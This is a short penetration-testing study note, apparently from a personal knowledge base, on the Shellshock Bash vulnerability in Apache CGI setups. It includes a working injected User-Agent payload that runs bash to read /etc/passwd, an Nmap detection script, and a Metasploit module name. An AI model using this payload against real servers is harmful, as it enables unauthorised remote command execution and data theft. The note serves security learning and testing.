Allows an attacker to execute arbitrary commands remotely via Bash. It is caused by Bash mistakenly executing commands after the series of characters : `() {:;};`

In the context of remote exploitation, Apache web servers configured to run CGI or shell scripts are vulnerable to this attack.

CGI scripts are used to execute commands on a linux machine, and display the result on a webpage

## Running the attack
+ Manually :
	+ Look for a CGI script on the web server
	+ [[Nmap]] script to check for vulnerability
		+ `http-shellshock`
	+ Make a GET request to the CGI script
		+ Modify the User-Agent header for example with :
			+ `() {:;}; echo; echo; /bin/bash -c 'cat /etc/passwd'`
+ With [[Metasploit]] :
	+ `exploit/multi/http/apache_mod_cgi_bash_env_exec`
